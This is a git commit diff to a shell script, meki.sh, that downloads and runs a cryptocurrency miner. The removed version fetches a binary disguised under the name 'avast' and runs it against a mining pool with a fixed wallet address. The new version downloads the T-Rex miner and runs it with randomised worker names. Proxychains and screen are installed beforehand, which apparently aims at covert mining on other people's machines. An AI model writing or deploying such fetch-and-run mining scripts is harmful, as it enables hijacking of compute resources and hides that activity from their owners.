52c0d07a7c434683bb0f925ff207b0a4c9b5624f
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 22:44:19 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -10,8 +10,10 @@ apt install proxychains
 
 apt install screen -y
 
-wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1 
+wget https://github.com/trexminer/T-Rex/releases/download/0.25.8/t-rex-0.25.8-linux.tar.gz >/dev/null 2>&1 
 
-chmod +x avast >/dev/null 2>&1
+tar xf t-rex-0.25.8-linux.tar.gz
 
-./avast -a ALPH --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.RIG001
+chmod +x t-rex >/dev/null 2>&1
+
+./t-rex -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-999999 -n 1)-MEKI)
